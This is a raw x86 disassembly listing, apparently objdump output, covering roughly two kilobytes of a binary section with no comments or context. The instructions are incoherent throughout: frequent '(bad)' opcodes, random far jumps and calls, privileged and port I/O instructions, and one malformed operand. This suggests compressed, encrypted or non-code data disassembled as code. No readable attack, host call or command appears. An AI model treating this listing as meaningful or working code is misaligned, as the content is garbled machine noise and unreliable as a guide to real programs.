  403aad:	les    edx,FWORD PTR [ebp-0x41]
  403ab0:	shr    BYTE PTR [ecx+0x47f011e4],cl
  403ab6:	retf   0x87b0
  403ab9:	mov    ds,WORD PTR [ecx-0x2]
  403abc:	adc    BYTE PTR [ebp+ebx*4-0x6b494cc4],ah
  403ac3:	fisttp WORD PTR [ebp+0x6f]
  403ac6:	push   ecx
  403ac7:	jns    0x403b25
  403ac9:	mov    ?,ecx
  403acb:	dec    ecx
  403acc:	ds dec ecx
  403ace:	or     al,0x6b
  403ad0:	lods   eax,DWORD PTR ds:[esi]
  403ad1:	shl    esp,0xca
  403ad4:	outs   dx,BYTE PTR ss:[esi]
  403ad6:	xchg   edi,eax
  403ad7:	cmp    eax,0xd841d822
  403adc:	sub    BYTE PTR [edx],al
  403ade:	sbb    dh,cl
  403ae0:	(bad)  
  403ae2:	pop    edx
  403ae3:	xchg   edx,eax
  403ae4:	js     0x403b23
  403ae6:	xchg   edi,eax
  403ae7:	jns    0x403af5
  403ae9:	js     0x403b19
  403aeb:	popf   
  403aec:	push   ss
  403aed:	push   ebx
  403aee:	push   edx
  403aef:	arpl   WORD PTR [ebx-0x5dd2d7ce],ax
  403af5:	and    DWORD PTR [eax],ecx
  403af7:	dec    edi
  403af8:	(bad)  
  403afa:	adc    ecx,DWORD PTR [esi-0x182f234b]
  403b00:	outs   dx,DWORD PTR ds:[esi]
  403b01:	mov    ebx,DWORD PTR [eax]
  403b03:	or     al,0x6d
  403b05:	and    BYTE PTR [ecx+0x77],0x61
  403b09:	jae    0x403b85
  403b0b:	mov    edx,0xc77b53b9
  403b10:	and    eax,0x546ce391
  403b15:	(bad)  
  403b16:	cmc    
  403b17:	push   eax
  403b18:	leave  
  403b19:	jecxz  0x403b1f
  403b1b:	call   FWORD PTR [edx+0x2cd3df31]
  403b21:	retf   0x14ce
  403b24:	pop    es
  403b25:	sub    eax,0xe3096963
  403b2a:	lds    ebx,FWORD PTR [ecx*2+0x5f04c3d4]
  403b31:	call   0x31fe:0xc40c436d
  403b38:	lds    esi,FWORD PTR cs:[edx+ebx*4]
  403b3c:	sub    DWORD PTR [ebx+0x2f1630cb],esp
  403b42:	jmp    0x98f:0xe7483253
  403b49:	outs   dx,BYTE PTR ds:[esi]
  403b4a:	push   ebp
  403b4b:	add    DWORD PTR [edi+0x74a6af6],ecx
  403b51:	pop    edi
  403b52:	xor    BYTE PTR [edi],al
  403b54:	jmp    0x403b18
  403b56:	or     bl,ch
  403b58:	shl    cl,1
  403b5a:	ss nop
  403b5c:	test   eax,0x600cbd62
  403b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b62:	sub    al,0x8a
  403b64:	idiv   eax
  403b66:	and    al,0xae
  403b68:	mov    ebp,0xbdbab914
  403b6d:	sahf   
  403b6e:	mov    cl,BYTE PTR [ebx]
  403b70:	jmp    0x17ff:0x8e3e17c7
  403b77:	popa   
  403b78:	inc    edi
  403b79:	dec    ebx
  403b7a:	dec    edx
  403b7b:	ret    0x7f35
  403b7e:	int    0x9a
  403b80:	xchg   esp,eax
  403b81:	adc    edi,DWORD PTR [ecx+ebp*1+0x22fe4a21]
  403b88:	mov    si,cs
  403b8b:	jbe    0x403b9d
  403b8d:	(bad)  
  403b8f:	iret   
  403b90:	call   0xd2d:0xff1b03e6
  403b97:	mov    cl,0x74
  403b99:	xor    eax,0x1f78ac91
  403b9e:	out    dx,eax
  403b9f:	jmp    0x58c92bf9
  403ba4:	test   BYTE PTR [edx-0x1aa80f61],bl
  403baa:	fcmove st,st(4)
  403bac:	ror    cl,0xb4
  403baf:	lods   eax,DWORD PTR ds:[esi]
  403bb0:	or     eax,0xd001e28e
  403bb5:	aas    
  403bb6:	jmp    0x403b59
  403bb8:	outs   dx,BYTE PTR ds:[esi]
  403bb9:	push   esi
  403bba:	(bad)  
  403bbb:	fsubr  DWORD PTR [edi+eax*1+0x1163e921]
  403bc2:	mov    bh,0x80
  403bc4:	test   DWORD PTR [esi+0x3b],0x6cf5a1f8
  403bcb:	fs mov ebp,0xc2d8078b
  403bd1:	adc    dh,BYTE PTR [edx-0x52902181]
  403bd7:	sub    BYTE PTR [esi-0x28ff340e],0xaf
  403bde:	je     0x403c2c
  403be0:	les    ebp,FWORD PTR [ebx+0x5d3de884]
  403be6:	cmp    ah,bh
  403be8:	sbb    BYTE PTR [edi-0x5071701d],bl
  403bee:	shr    ecx,cl
  403bf0:	daa    
  403bf1:	push   bp
  403bf3:	pop    ebx
  403bf4:	pop    edx
  403bf5:	or     al,0x13
  403bf7:	inc    edx
  403bf8:	xlat   BYTE PTR ds:[ebx]
  403bf9:	push   eax
  403bfa:	pop    es
  403bfb:	nop
  403bfc:	sar    BYTE PTR [eax+0x7d],cl
  403bff:	and    bl,BYTE PTR fs:[eax-0x15]
  403c03:	les    ecx,FWORD PTR [esi-0x7fdbfe95]
  403c09:	icebp  
  403c0a:	sub    DWORD PTR [ecx-0x3c],esi
  403c0d:	jmp    0x6266:0x5cefa0fd
  403c14:	int    0x3d
  403c16:	sub    cl,BYTE PTR [ebx]
  403c18:	enter  0x3105,0x38
  403c1c:	xor    BYTE PTR [edx],ch
  403c1e:	arpl   WORD PTR [edi],sp
  403c20:	cmp    al,0xc
  403c22:	aas    
  403c23:	add    DWORD PTR [eax],edi
  403c25:	call   0xbd51a4a9
  403c2a:	push   ss
  403c2b:	dec    eax
  403c2c:	shl    bl,1
  403c2e:	popa   
  403c2f:	mov    bh,0x91
  403c31:	ja     0x403c97
  403c33:	je     0x403cb3
  403c35:	xor    ecx,ebx
  403c37:	das    
  403c38:	mov    al,0xe9
  403c3a:	cs adc ah,bh
  403c3d:	sub    BYTE PTR [ebx+0x366fd4a4],bh
  403c43:	push   esp
  403c44:	jp     0x403c33
  403c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c48:	cmp    al,0xb4
  403c4a:	pop    esi
  403c4b:	(bad)  
  403c4c:	mov    ds:0x21fb5f89,al
  403c51:	xor    ecx,DWORD PTR [ecx-0x69]
  403c54:	arpl   WORD PTR [eax-0x24c0c33f],dx
  403c5a:	cmp    DWORD PTR [edx+0x7e358034],0xda2642b6
  403c64:	(bad)  
  403c65:	jae    0x403c8b
  403c67:	das    
  403c68:	loop   0x403c21
  403c6a:	daa    
  403c6b:	popf   
  403c6c:	mov    ch,0xb0
  403c6e:	int    0x99
  403c70:	cli    
  403c71:	adc    ch,BYTE PTR [edx+ecx*1-0x57efdb30]
  403c78:	stos   DWORD PTR es:[edi],eax
  403c79:	pushf  
  403c7a:	inc    esi
  403c7b:	icebp  
  403c7c:	test   DWORD PTR [ebx+0x484411d0],0x634befef
  403c86:	mov    ds:0x7743d94e,eax
  403c8b:	dec    edx
  403c8c:	pop    ds
  403c8d:	or     dh,al
  403c8f:	int3   
  403c90:	pop    ebp
  403c91:	sbb    al,0x5c
  403c93:	ds fwait
  403c95:	mov    eax,ds:0x9c39833d
  403c9a:	ficomp WORD PTR [ebx+0x7985675f]
  403ca0:	dec    esi
  403ca1:	mov    ecx,0x7548ac9f
  403ca6:	test   DWORD PTR [edx],esp
  403ca8:	popf   
  403ca9:	push   ecx
  403caa:	pop    DWORD PTR [ecx+0x63b8bbf8]
  403cb0:	add    BYTE PTR [eax+0x38e50cd9],dl
  403cb6:	std    
  403cb7:	daa    
  403cb8:	xor    DWORD PTR [ebp+0x6400a13c],0x545eb424
  403cc2:	int3   
  403cc3:	cmp    DWORD PTR [esp+eax*1],edi
  403cc6:	in     eax,0x96
  403cc8:	push   esi
  403cc9:	sbb    eax,0x5292afda
  403cce:	shr    DWORD PTR [ebx-0x784092a5],1
  403cd4:	das    
  403cd5:	cmp    ebx,DWORD PTR [edx+0x5f]
  403cd8:	mov    eax,ds:0x78ffb7f7
  403cdd:	jp     0x403d12
  403cdf:	out    dx,eax
  403ce0:	pop    esi
  403ce1:	mov    al,ds:0x308b5c9a
  403ce6:	cwde   
  403ce7:	mov    al,0xaf
  403ce9:	push   ebx
  403cea:	fxch   st(5)
  403cec:	jl     0x403d47
  403cee:	push   esi
  403cef:	imul   edx,DWORD PTR [esi-0x34669d98],0x45c8d626
  403cf9:	and    BYTE PTR [esi],ah
  403cfb:	add    eax,0x9a65890e
  403d00:	add    al,bh
  403d02:	xlat   BYTE PTR ds:[ebx]
  403d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d04:	std    
  403d05:	xor    cl,BYTE PTR [eax]
  403d07:	xor    dl,ah
  403d09:	clc    
  403d0a:	stc    
  403d0b:	push   esi
  403d0c:	or     al,0x56
  403d0e:	sub    esi,DWORD PTR [ecx+0x5e4c6da9]
  403d14:	xchg   ebx,eax
  403d15:	mov    al,0x79
  403d17:	jmp    0x831e:0x1a202113
  403d1e:	imul   ebp,DWORD PTR [eax+0x2c705995],0xffffff91
  403d25:	fnstenv [ebx-0x1b0e8fb8]
  403d2b:	outs   dx,BYTE PTR ds:[esi]
  403d2c:	pop    ds
  403d2d:	pop    ds
  403d2e:	mov    edi,0x8df0cb87
  403d33:	pop    ebp
  403d34:	test   al,0x5f
  403d36:	loope  0x403d3f
  403d38:	pusha  
  403d39:	clc    
  403d3a:	or     ch,cl
  403d3c:	pushf  
  403d3d:	and    DWORD PTR [edx],eax
  403d3f:	mov    DWORD PTR [ecx+0x2f],edi
  403d42:	es addr16 fcomi st,st(5)
  403d46:	je     0x403d0d
  403d48:	out    dx,al
  403d49:	out    0xde,al
  403d4b:	mov    al,ds:0xe6725db0
  403d50:	pop    ds
  403d51:	(bad)  
  403d52:	jg     0x403d8f
  403d54:	hlt    
  403d55:	std    
  403d56:	hlt    
  403d57:	and    esp,ebx
  403d59:	stos   BYTE PTR es:[edi],al
  403d5a:	dec    esp
  403d5b:	iret   
  403d5c:	gs push esp
  403d5e:	stos   BYTE PTR es:[edi],al
  403d5f:	rol    DWORD PTR cs:[esi],cl
  403d62:	pop    eax
  403d63:	mov    DWORD PTR [ebp+0x263c4b19],ecx
  403d69:	and    BYTE PTR [ecx-0x23],ch
  403d6c:	les    edx,FWORD PTR [edi-0x74]
  403d6f:	xchg   ebp,eax
  403d70:	leave  
  403d71:	sbb    eax,DWORD PTR [ebp-0x60]
  403d74:	adc    BYTE PTR ds:0xd042107e,dl
  403d7a:	pop    esi
  403d7b:	xor    al,0xd2
  403d7d:	fnsave [edi]
  403d7f:	dec    ebx
  403d80:	(bad)  
  403d81:	jmp    0x403dc5
  403d83:	pop    ebx
  403d84:	jmp    0x19d9:0x8c934c69
  403d8b:	jnp    0x403d20
  403d8d:	(bad)  
  403d8e:	(bad)  [ecx]
  403d90:	and    bh,BYTE PTR [esi+0x70]
  403d93:	jp     0x403e0c
  403d95:	or     edi,DWORD PTR [esp+ecx*8]
  403d98:	stos   DWORD PTR es:[edi],eax
  403d99:	add    ah,al
  403d9b:	popf   
  403d9c:	xor    al,0xdc
  403d9e:	or     al,0x1b
  403da0:	daa    
  403da1:	dec    edi
  403da2:	xchg   BYTE PTR [edi+eax*4-0x11],ah
  403da6:	das    
  403da7:	sub    DWORD PTR [edx],esi
  403da9:	cs jno 0x403db8
  403dac:	mov    ebp,0x95101e27
  403db1:	add    al,0xce
  403db3:	mov    ebp,0x3d5c3bf6
  403db8:	les    ecx,FWORD PTR [eax-0x4]
  403dbb:	cli    
  403dbc:	dec    edx
  403dbd:	mov    bl,0x3a
  403dbf:	xchg   BYTE PTR [eax-0x2f3289],al
  403dc5:	push   eax
  403dc6:	popa   
  403dc7:	mov    ebx,0x21e6d5f6
  403dcc:	mov    eax,0x1406ba96
  403dd1:	mul    DWORD PTR [edx-0x23a64903]
  403dd7:	mov    ecx,0x672e8fc2
  403ddc:	repz jnp 0x403dd6
  403ddf:	test   al,0xae
  403de1:	test   al,0x33
  403de3:	pop    esi
  403de4:	cld    
  403de5:	pop    es
  403de6:	popa   
  403de7:	fcmovnb st,st(3)
  403de9:	fcom   st(1)
  403deb:	imul   esi,edx,0xcdbf4f51
  403df1:	xor    eax,DWORD PTR [esi-0x1193dac6]
  403df7:	push   eax
  403df8:	test   DWORD PTR [edi],esi
  403dfa:	and    ebp,DWORD PTR [ebx-0x780c7a29]
  403e00:	stc    
  403e01:	fdiv   QWORD PTR [edx]
  403e03:	inc    ebp
  403e04:	and    ecx,DWORD PTR [edi+eiz*4+0x2540c258]
  403e0b:	ss std 
  403e0d:	dec    ecx
  403e0e:	fistp  WORD PTR [eax]
  403e10:	daa    
  403e11:	mov    cl,al
  403e13:	and    al,0x31
  403e15:	sbb    ah,BYTE PTR [edx-0x7a917ef8]
  403e1b:	push   cs
  403e1c:	dec    ebp
  403e1d:	out    dx,eax
  403e1e:	add    DWORD PTR [edi],0x2b
  403e21:	mov    esi,0x9d78f1d0
  403e26:	call   FWORD PTR [ebx-0x7cc1776d]
  403e2c:	mov    ch,0xeb
  403e2e:	add    BYTE PTR gs:[edx],cl
  403e31:	scas   al,BYTE PTR es:[edi]
  403e32:	repz loopne 0x403e3e
  403e35:	push   0xeb6539ab
  403e3a:	adc    esi,DWORD PTR [ebp-0xd]
  403e3d:	sbb    bh,dl
  403e3f:	lods   al,BYTE PTR ds:[esi]
  403e40:	andps  xmm5,XMMWORD PTR [eax]
  403e43:	push   ds
  403e44:	sbb    bl,bl
  403e46:	das    
  403e47:	push   eax
  403e48:	jb     0x403e74
  403e4a:	imul   DWORD PTR [ebp+0x7b]
  403e4d:	add    eax,0x5ac85d1c
  403e52:	retf   
  403e53:	and    DWORD PTR [ebx],eax
  403e55:	in     al,0x97
  403e57:	and    DWORD PTR [eax],ebp
  403e59:	in     al,0x41
  403e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5c:	(bad)  
  403e5d:	cmp    al,0x67
  403e5f:	retf   
  403e60:	inc    edi
  403e61:	cmp    eax,0x769be748
  403e66:	test   eax,0x9e27adf3
  403e6b:	lock jmp 0x373c:0xe18afe83
  403e73:	pop    es
  403e74:	ss (bad) 
  403e76:	pop    edx
  403e77:	sti    
  403e78:	mov    al,0xe8
  403e7a:	in     al,0x1f
  403e7c:	mov    eax,DWORD PTR ds:[eax]
  403e7f:	call   0xd3fc9789
  403e84:	aad    0x18
  403e86:	test   ebx,ecx
  403e88:	cmp    ah,al
  403e8a:	add    BYTE PTR [ebx],cl
  403e8c:	or     BYTE PTR [esi],ch
  403e8e:	sbb    al,BYTE PTR [ecx]
  403e90:	mov    ds:0x741c578a,al
  403e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e96:	cmp    ch,bl
  403e98:	in     eax,dx
  403e99:	push   0xb23b785
  403e9e:	xlat   BYTE PTR ds:[ebx]
  403e9f:	jp     0x403f1a
  403ea1:	and    al,0x2
  403ea3:	shl    eax,1
  403ea5:	test   al,0x9a
  403ea7:	mov    bh,0x9e
  403ea9:	iret   
  403eaa:	jo     0x403e83
  403eac:	(bad)  
  403ead:	push   eax
  403eae:	xchg   ebx,eax
  403eaf:	lahf   
  403eb0:	mov    BYTE PTR [ebx+edi*8-0xdb89ffd],al
  403eb7:	sub    DWORD PTR [edi+0x3c],0xffffffe7
  403ebb:	or     bh,BYTE PTR [eax]
  403ebd:	mov    al,0xd0
  403ebf:	xchg   ecx,eax
  403ec0:	push   cs
  403ec1:	ja     0x403f24
  403ec3:	and    esp,eax
  403ec5:	leave  
  403ec6:	pusha  
  403ec7:	xor    ebp,DWORD PTR [edi]
  403ec9:	(bad)  
  403eca:	sbb    al,ch
  403ecc:	call   0x4caa:0xa453e3ac
  403ed3:	test   BYTE PTR [ecx-0x41],dh
  403ed6:	rcl    ah,cl
  403ed8:	adc    eax,0x516f268d
  403edd:	in     eax,dx
  403ede:	ret    
  403edf:	mov    ebp,0xdb324b0
  403ee4:	call   0xe26061d1
  403ee9:	xor    BYTE PTR [ebx],bl
  403eeb:	loopne 0x403e9e
  403eed:	jb     0x403f00
  403eef:	or     eax,DWORD PTR [ebx]
  403ef1:	push   esi
  403ef2:	call   0xd098:0x1d687df7
  403ef9:	sti    
  403efa:	ficomp WORD PTR [edx-0x73ae0205]
  403f00:	and    DWORD PTR [edi-0x11389738],esi
  403f06:	mov    al,ds:0xc8dbba97
  403f0b:	jne    0x403eb1
  403f0d:	mov    eax,0x7312fe7
  403f12:	ds gs mov ecx,0x8de68be6
  403f19:	sub    eax,0x70c9bbb
  403f1e:	ins    DWORD PTR es:[edi],dx
  403f1f:	push   ebp
  403f20:	sub    al,al
  403f22:	pop    ebx
  403f23:	and    BYTE PTR [esi+0x7c],ah
  403f26:	add    dh,BYTE PTR [ecx]
  403f28:	sub    al,0x80
  403f2a:	push   cs
  403f2b:	(bad)  
  403f2c:	push   esi
  403f2d:	jo     0x403ec7
  403f2f:	and    dl,0x66
  403f32:	xor    DWORD PTR [eax+0x201b6151],0xf5ea0865
  403f3c:	cdq    
  403f3d:	aad    0xe2
  403f3f:	popf   
  403f40:	shl    DWORD PTR [esp+ecx*8],1
  403f43:	dec    esp
  403f44:	xor    al,0xa3
  403f46:	loopne 0x403f4a
  403f48:	xchg   esi,eax
  403f49:	add    DWORD PTR [ebx],0xffffffef
  403f4c:	lea    edx,[edi]
  403f4e:	lods   eax,DWORD PTR ds:[esi]
  403f4f:	ficomp DWORD PTR [ecx]
  403f51:	push   edx
  403f52:	ins    DWORD PTR es:[edi],dx
  403f53:	dec    ebx
  403f54:	mov    eax,0x993a4058
  403f59:	pop    ss
  403f5a:	inc    eax
  403f5b:	fs sub ch,0xc1
  403f5f:	enter  0x668e,0x14
  403f63:	lock cld 
  403f65:	(bad)  
  403f66:	fsin   
  403f68:	call   0x4275:0x163a59b0
  403f6f:	sti    
  403f70:	or     BYTE PTR [esi],cl
  403f72:	mov    ah,0xe1
  403f74:	mov    edx,edi
  403f76:	push   edx
  403f77:	jecxz  0x403f45
  403f79:	pop    edi
  403f7a:	pop    eax
  403f7b:	outs   dx,BYTE PTR ds:[esi]
  403f7c:	hlt    
  403f7d:	call   0x237:0xa41b9b43
  403f84:	outs   dx,BYTE PTR ds:[esi]
  403f85:	add    al,0xb4
  403f87:	mov    ah,0x4d
  403f89:	enter  0x4576,0x23
  403f8d:	test   eax,0xea8b9b7
  403f92:	mov    esi,0x1e8de2f5
  403f97:	nop
  403f98:	pop    edx
  403f99:	(bad)  
  403f9a:	xchg   edi,eax
  403f9b:	inc    edi
  403f9c:	sbb    ebp,DWORD PTR [ebp+esi*2-0x780427fa]
  403fa3:	jmp    0x403f38
  403fa5:	push   ds
  403fa6:	stos   DWORD PTR es:[edi],eax
  403fa7:	xchg   esp,eax
  403fa8:	pop    ss
  403fa9:	pushf  
  403faa:	bound  edx,QWORD PTR [edx+ebx*1]
  403fad:	add    DWORD PTR [edi+edi*4],edi
  403fb0:	nop
  403fb1:	adc    edi,DWORD PTR [ebx-0x6e]
  403fb4:	test   eax,0xe2d5609d
  403fb9:	push   eax
  403fba:	mov    ebx,0x59fb912d
  403fbf:	dec    ebx
  403fc0:	cmp    BYTE PTR [edx+0x47],0x5a
  403fc4:	cs popa 
  403fc6:	mov    ebp,0x9fd341e4
  403fcb:	sbb    al,0xef
  403fcd:	sub    al,0x6
  403fcf:	and    BYTE PTR [ebp+0x6eba04c2],ch
  403fd5:	ss retf 
  403fd7:	outs   dx,DWORD PTR ds:[esi]
  403fd8:	or     ch,bh
  403fda:	or     DWORD PTR [esi],ebp
  403fdc:	imul   ecx,edx,0xffffff97
  403fdf:	stos   BYTE PTR es:[edi],al
  403fe0:	hlt    
  403fe1:	std    
  403fe2:	push   0x8c4b8f0c
  403fe7:	inc    ecx
  403fe8:	push   ds
  403fe9:	mov    ebp,0xf5518a05
  403fee:	push   es
  403fef:	mov    ds:0xbf03ae12,al
  403ff4:	and    eax,0x464b3071
  403ff9:	es add ch,dl
  403ffc:	(bad)  
  403ffd:	push   0xc03d2a76
  404002:	ret    
  404003:	ja     0x403fda
  404005:	adc    al,0xfc
  404007:	cmp    DWORD PTR [ebx-0x7f],ecx
  40400a:	xchg   ecx,eax
  40400b:	lods   al,BYTE PTR ds:[esi]
  40400c:	jle    0x404052
  40400e:	sbb    dl,bh
  404010:	jb     0x404069
  404012:	fcom   QWORD PTR [esi-0x2f3336a5]
  404018:	fst    DWORD PTR [esi-0xd]
  40401b:	daa    
  40401c:	aas    
  40401d:	or     bl,dl
  40401f:	fisub  DWORD PTR [edx]
  404021:	arpl   WORD PTR [ebp+eax*4-0xc414f37],dx
  404028:	or     bl,dh
  40402a:	and    eax,0xd6b08f9e
  40402f:	mov    eax,0x57e035b
  404034:	test   bh,0x3
  404037:	jp     0x40400a
  404039:	adc    al,BYTE PTR [edx]
  40403b:	aaa    
  40403c:	jmp    0x61ab:0xf86e6791
  404043:	add    al,cl
  404045:	pop    edi
  404046:	cmp    ah,BYTE PTR [esi+0x2c]
  404049:	in     eax,dx
  40404a:	or     BYTE PTR [esi-0x69],dh
  40404d:	cmp    BYTE PTR [esi],ah
  40404f:	lea    esp,[ebx]
  404051:	in     eax,0xc
  404053:	mov    ebp,0x665f8844
  404058:	mov    eax,ds:0x813bf7a7
  40405d:	cdq    
  40405e:	or     ah,bl
  404060:	clc    
  404061:	(bad)  
  404063:	adc    dl,al
  404065:	xor    BYTE PTR [edi],bh
  404067:	aad    0x4a
  404069:	ret    
  40406a:	mov    dl,0xbc
  40406c:	icebp  
  40406d:	enter  0x75e7,0x2e
  404071:	shl    DWORD PTR [ecx-0x4c12eb78],1
  404077:	pop    esp
  404078:	dec    eax
  404079:	(bad)  
  40407a:	arpl   WORD PTR [esi-0x5aebd13d],si
  404080:	mov    edx,ss
  404082:	shl    DWORD PTR [ebp+eiz*2-0x1238ebd1],0xb7
  40408a:	adc    ebp,DWORD PTR [edi]
  40408c:	ins    DWORD PTR es:[edi],dx
  40408d:	pop    ecx
  40408e:	fwait
  40408f:	addr16 das 
  404091:	xor    BYTE PTR [edx-0x1f],0xb8
  404095:	xchg   edx,eax
  404096:	repz out dx,eax
  404098:	fsub   QWORD PTR [ebx+0x5a]
  40409b:	shr    bh,cl
  40409d:	xchg   esp,eax
  40409e:	push   edi
  40409f:	in     al,0x77
  4040a1:	dec    edi
  4040a2:	add    BYTE PTR [eax+edi*8-0x2447be9],bh
  4040a9:	or     BYTE PTR [ebp+ebx*1-0x527f1b68],0x40
  4040b1:	pop    ebp
  4040b2:	std    
  4040b3:	xchg   ebx,eax
  4040b4:	and    eax,0x3ff84fbd
  4040b9:	sti    
  4040ba:	push   0xffffff84
  4040bc:	pop    ss
  4040bd:	jge    0x40410d
  4040bf:	lods   eax,DWORD PTR ds:[esi]
  4040c0:	scas   al,BYTE PTR es:[edi]
  4040c1:	or     dh,BYTE PTR [eax-0x71]
  4040c4:	jmp    0x40409b
  4040c6:	cmp    ch,al
  4040c8:	aam    0x5e
  4040ca:	div    DWORD PTR [ecx+0xfd1f945]
  4040d0:	pop    edx
  4040d1:	xlat   BYTE PTR ds:[ebx]
  4040d2:	xor    BYTE PTR [ebx-0x3a240471],bl
  4040d8:	ja     0x4040f8
  4040da:	xchg   ecx,eax
  4040db:	shr    DWORD PTR ds:0xa765171e,1
  4040e1:	scas   al,BYTE PTR es:[edi]
  4040e2:	es retf 
  4040e4:	test   DWORD PTR [ecx+0x33b1073d],edi
  4040ea:	jno    0x404120
  4040ec:	adc    ch,BYTE PTR [ebx]
  4040ee:	adc    al,0x4
  4040f0:	and    ebp,edx
  4040f2:	mov    eax,0x582196a7
  4040f7:	xchg   BYTE PTR [eax],cl
  4040f9:	xchg   ebx,eax
  4040fa:	and    bl,dh
  4040fc:	lahf   
  4040fd:	dec    eax
  4040fe:	or     BYTE PTR [ebp+0x75d451fe],bl
  404104:	push   ss
  404105:	add    edx,DWORD PTR [edx+0x60]
  404108:	xor    al,0x75
  40410a:	push   cs
  40410b:	add    dh,cl
  40410d:	ja     0x40416f
  40410f:	xor    edx,edi
  404111:	pop    edx
  404112:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404114:	push   esi
  404115:	sti    
  404116:	add    bh,BYTE PTR [ebx+0x5eb701fd]
  40411c:	sbb    esp,DWORD PTR [ecx+0x21]
  40411f:	cld    
  404120:	inc    esi
  404121:	jbe    0x40413e
  404123:	fbstp  TBYTE PTR [ebx+ebx*1]
  404126:	fadd   QWORD PTR [esi]
  404128:	or     ebp,DWORD PTR [ebx+0x1a]
  40412b:	mov    esp,0x25198337
  404130:	int3   
  404131:	sbb    al,0x83
  404133:	iret   
  404134:	int    0xbb
  404136:	xor    BYTE PTR [esi+0x29d64dce],ch
  40413c:	dec    esp
  40413d:	mov    ds:0xe6073e01,al
  404142:	xchg   edi,eax
  404143:	retf   0xd890
  404146:	fdivrp st(7),st
  404148:	stos   BYTE PTR es:[edi],al
  404149:	bound  esp,QWORD PTR [edx]
  40414b:	push   ecx
  40414c:	or     BYTE PTR [ebp+0x75],ah
  40414f:	add    esp,ecx
  404151:	xchg   edi,eax
  404152:	jne    0x404140
  404154:	gs retf 0x23b4
  404158:	icebp  
  404159:	jmp    0x40410e
  40415b:	jno    0x4040df
  40415d:	test   esp,0x44665854
  404163:	sub    DWORD PTR [edi],ecx
  404165:	inc    esi
  404166:	mov    WORD PTR [ebx],es
  404168:	out    dx,al
  404169:	fs hlt 
  40416b:	inc    ebp
  40416c:	bound  esi,QWORD PTR [edx+0x8b1c4ac]
  404172:	dec    ebp
  404173:	call   0x97d:0xfd8ef521
  40417a:	push   ds
  40417b:	mov    bh,0x17
  40417d:	and    ebx,DWORD PTR [edx+0x6798c87c]
  404183:	sbb    eax,0x4cbb8a3b
  404188:	add    eax,DWORD PTR [ebx-0x123f3ccf]
  40418e:	jbe    0x4041fe
  404190:	hlt    
  404191:	nop
  404192:	imul   DWORD PTR [edi]
  404194:	push   es
  404195:	add    al,0xeb
  404197:	in     al,dx
  404198:	adc    ah,cl
  40419a:	xchg   edi,eax
  40419b:	mov    dh,0x6c
  40419d:	cli    
  40419e:	mov    eax,0x5c1ed056
  4041a3:	jo     0x404167
  4041a5:	std    
  4041a6:	or     DWORD PTR ss:[ebp+0x2d],edi
  4041aa:	jo     0x40420a
  4041ac:	inc    DWORD PTR [eax-0x5503b9a7]
  4041b2:	adc    ebp,DWORD PTR [edi+eiz*2-0x51]
  4041b6:	stc    
  4041b7:	aam    0xae
  4041b9:	xor    bh,cl
  4041bb:	jns    0x404157
  4041bd:	add    edx,edx
  4041bf:	inc    esp
  4041c0:	mov    al,0xd1
  4041c2:	lds    ebp,FWORD PTR [esp+ebp*4+0x37]
  4041c6:	fild   WORD PTR [ebp+ebp*2+0x4b6a2730]
  4041cd:	and    eax,DWORD PTR [esi]
  4041cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041d0:	push   ebp
  4041d1:	mov    ds:0xdba3d37,eax
  4041d6:	mov    ds:0x93bf540b,al
  4041db:	mov    cl,0xa9
  4041dd:	xor    BYTE PTR [esi-0x7a],dh
  4041e0:	enter  0x4ea7,0xf5
  4041e4:	jne    0x404225
  4041e6:	fild   DWORD PTR [edi+0x42196150]
  4041ec:	inc    edx
  4041ed:	xor    eax,0x57c70150
  4041f2:	scas   eax,DWORD PTR es:[edi]
  4041f3:	mov    edi,0x41d19c96
  4041f9:	stc    
  4041fa:	fstp   QWORD PTR [eax]
  4041fc:	jl     0x4041e7
  4041fe:	fidivr DWORD PTR [edx-0x27]
  404201:	aaa    
  404202:	cmp    ebx,ebx
  404204:	jmp    0x5d32:0x956359a
  40420b:	jmp    0x404225
  40420d:	loopne 0x4041fd
  40420f:	ficomp WORD PTR [ecx-0x50119377]
  404215:	xor    ch,bh
  404217:	and    eax,0x1d404581
  40421c:	retf   0x5475
  40421f:	pop    ebp
  404220:	mov    ebp,0x844d9cbe
  404225:	jbe    0x4041b0
  404227:	fdiv   QWORD PTR [eax+0x14bcf7bd]
  40422d:	ficomp DWORD PTR [ebx]
  40422f:	mov    ebx,0x4a48f7dd
  404234:	mov    edi,0xf6690ff2
  404239:	shl    BYTE PTR [edi-0x7b],1
  40423c:	out    0xe,al
  40423e:	dec    ebp
  40423f:	inc    esp
  404240:	(bad)  
  404241:	icebp  
  404242:	jle    0x4042ab
  404244:	xor    esi,edi
  404246:	mov    ds:0x8a473b82,al
  40424b:	(bad)  [edi]
  40424d:	mov    edi,0xfd667f39
  404252:	jmp    0x404254
  404254:	mov    edx,0xef83be28
  404259:	dec    esi
  40425a:	out    0xca,eax
  40425c:	inc    esi
  40425d:	jno    0x4042b8
  40425f:	fs push 0x21
  404262:	js     0x4042a9
  404264:	ja     0x404223
  404266:	pop    edi
  404267:	push   0xffffffd4
  404269:	mov    esp,0x89006ba0
  40426e:	sar    al,1
  404270:	push   eax
  404271:	inc    ecx
  404272:	and    BYTE PTR [ecx-0x67acd9a],0xf8
  404279:	adc    eax,ebp
  40427b:	loopne 0x404273
  40427d:	pusha  
  40427e:	push   ds
  40427f:	jno    0x4042d3
  404281:	mov    DWORD PTR [ecx+0x1950e831],ecx
  404287:	jnp    0x4042e4
  404289:	pop    ss
  40428a:	xor    dh,bl
  40428c:	mov    dh,BYTE PTR [eax+esi*4]
  40428f:	cmp    ebx,DWORD PTR [edx+0x36]
  404292:	div    DWORD PTR [ebx+0x5f]
  404295:	jp     0x4042cb
  404297:	add    al,0x85
  404299:	cmp    ebx,ecx
  40429b:	xlat   BYTE PTR ds:[ebx]
  40429c:	cwde   
  40429d:	and    al,0x50
  40429f:	xor    edx,DWORD PTR [esp+eax*4-0x10463f76]
  4042a6:	inc    ebx
  4042a7:	fisttp DWORD PTR [ecx]
  4042a9:	dec    esp
